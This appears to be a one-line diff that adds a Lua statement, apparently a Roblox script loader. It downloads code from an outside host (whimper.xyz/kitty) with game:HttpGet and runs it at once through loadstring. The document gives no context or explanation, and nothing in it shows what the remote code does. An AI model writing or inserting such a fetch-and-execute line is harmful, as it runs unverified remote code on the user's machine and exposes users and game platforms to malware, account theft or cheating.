@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
